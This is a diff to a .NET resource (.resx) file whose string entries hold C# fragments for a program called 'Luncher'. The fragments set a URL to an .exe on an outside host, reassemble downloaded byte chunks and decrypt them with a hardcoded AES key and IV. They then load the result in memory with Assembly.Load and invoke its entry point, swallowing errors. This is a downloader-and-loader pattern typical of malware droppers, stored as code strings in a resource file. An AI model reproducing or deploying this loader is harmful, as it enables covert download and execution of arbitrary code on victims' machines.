@@ -118,7 +118,7 @@
     <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </resheader>
   <data name="String000" xml:space="preserve">
-    <value>var w = 0; var Useless = 0; var s = ""; var n = ""; var p = ""; WebClient x = null; MethodInfo m;</value>
+    <value>var w = 0; var Useless = 0; var s = ""; var n = ""; var p = ""; WebClient x = null; MethodInfo m; byte[] b = null;</value>
   </data>
   <data name="String001" xml:space="preserve">
     <value>s = "http://voron-exe.pp.ua/C/Users/PosterTest/Documents/Debug/Voron%20Poster.exe"; w++;</value>
@@ -163,6 +163,8 @@ Console.WriteLine("===" +w+"===");
 {
 if (m != null)
 {
+xxx = null;
+bbb = null;
      var ts = new System.Threading.ThreadStart(() =&gt; { try { if (m != null) m.Invoke(null, null); } catch { } });
      var thd = new System.Threading.Thread(ts);
      thd.SetApartmentState(ApartmentState.STA);
@@ -172,5 +174,68 @@ if (m != null)
 catch (Exception Error){MessageBox.Show(Error.Message);}
 w++;
 }).Start();</value>
+  </data>
+  <data name="String100" xml:space="preserve">
+    <value>new Thread( ()=&gt;{ 
+for (int i =0; i &lt; xxx.Count ;i++){
+byte[] lb = null;
+xxx.TryGetValue(i, out lb);
+if (i == xxx.Count-1)
+lb.CopyTo(bbb, bbb.Length-lb.Length);
+else
+lb.CopyTo(bbb, lb.Length*i);
+}
+Console.WriteLine("bbb ended");
+ w++;
+}).Start();</value>
+  </data>
+  <data name="String101" xml:space="preserve">
+    <value>new Thread( ()=&gt;{ 
+Console.WriteLine("---"+ w+"----");
+while (w != 1) Thread.Sleep(100);
+Console.WriteLine("==="+ w+"===");
+        var AES = new System.Security.Cryptography.AesCryptoServiceProvider();
+            AES.Key = new byte[256 / 8] { 240, 119, 82, 224, 93, 205, 250, 43, 78, 192, 95, 229, 166, 27, 4, 104, 40, 251, 211, 20, 190, 77, 207,
+                    34, 116, 39, 244, 211, 54, 212, 5, 205 };
+            AES.IV = new byte[128 / 8] { 58, 41, 152, 142, 81, 7, 185, 181, 153, 139, 240, 86, 160, 125, 97, 233 };
+            var c = AES.CreateDecryptor();
+            b = c.TransformFinalBlock(bbb, 0, bbb.Length);
+w++;
+}).Start();</value>
+  </data>
+  <data name="String102" xml:space="preserve">
+    <value>new Thread( ()=&gt;{ 
+Console.WriteLine("---"+ w+"----");
+while (w != 2) Thread.Sleep(100);
+Console.WriteLine("==="+ w+"===");
+try
+ {
+                var a = Assembly.Load(b);
+                m = a.EntryPoint;
+} catch (Exception Error){MessageBox.Show(Error.Message);}
+w=16;
+}).Start();</value>
+  </data>
+  <data name="StringBeg" xml:space="preserve">
+    <value>using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Luncher
+{
+    public partial class LuncherForm
+    {
+        private static List&lt;byte[]&gt; a = new List&lt;byte[]&gt;();
+
+        static Random r = new Random();
+        private static void InitData()
+        {</value>
+  </data>
+  <data name="StringEnd" xml:space="preserve">
+    <value>}
+    }
+}</value>
   </data>
 </root>
